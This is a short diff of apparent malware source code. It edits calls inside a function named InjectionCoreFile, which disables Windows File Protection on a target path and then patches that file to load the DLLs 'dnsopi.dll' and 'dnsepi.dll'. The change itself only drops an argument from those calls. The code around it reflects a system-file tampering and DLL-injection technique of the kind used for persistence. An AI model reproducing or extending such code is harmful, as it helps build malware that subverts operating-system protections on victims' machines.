@@ -133,7 +133,7 @@ void InjectionCoreFile() {
 	}
 
 	DisableWFP(szTargetPath);
-	AddDllToFile("dnsopi.dll", szTargetPath, FALSE);
+	AddDllToFile("dnsopi.dll", szTargetPath);
 
 	//////////////////////////////////////////////////////////////////////////
 
@@ -142,7 +142,7 @@ void InjectionCoreFile() {
 	}
 
 	DisableWFP(szTargetPath);
-	AddDllToFile("dnsepi.dll", szTargetPath, FALSE);
+	AddDllToFile("dnsepi.dll", szTargetPath);
 
 }
 
